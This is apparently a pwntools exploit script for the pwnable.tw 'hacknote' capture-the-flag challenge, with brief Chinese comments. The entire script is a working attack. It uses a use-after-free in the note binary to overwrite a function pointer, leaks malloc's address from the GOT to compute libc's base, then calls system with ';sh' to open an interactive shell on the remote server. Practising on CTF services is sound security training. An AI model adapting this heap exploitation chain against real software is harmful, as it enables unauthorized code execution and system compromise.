from pwn import *
# context.log_level = 'debug'
# io=process('./hacknote')
io=remote('chall.pwnable.tw','10102')
elf=ELF('./hacknote')
libc=ELF('libc_32.so.6')
addr_putsa1=0x0804862B    #不能是plt里的，因为它需要参数在栈里

def add_note(size,content):
    io.recvuntil(b'Your choice :')
    io.sendline(b'1')
    io.recvuntil(b'Note size :')
    io.sendline(str(size).encode())
    io.recvuntil(b'Content :')
    io.sendline(content)

def delete_note(index):
    io.recvuntil(b'Your choice :')
    io.sendline(b'2')
    io.recvuntil(b'Index :')
    io.sendline(str(index).encode())

def print_note(index):
    io.recvuntil(b'Your choice :')
    io.sendline(b'3')
    io.recvuntil(b'Index :')
    io.sendline(str(index).encode())

add_note(200,b'lft')
add_note(200,b'sh')
delete_note(0)
delete_note(1)

add_note(8,p32(addr_putsa1)+p32(elf.got['malloc']))
print_note(0)
addr_malloc=u32(io.recv(numb=4))
print(hex(addr_malloc))
libc.address=addr_malloc-libc.sym['malloc']
addr_system=libc.sym['system']

delete_note(2)
add_note(8,p32(addr_system)+b';sh\x00')#这里是system函数，所以会把整个note指针传入进去，所以需要用分号把前面的表示函数地址的数据给或掉
print_note(0)

io.interactive()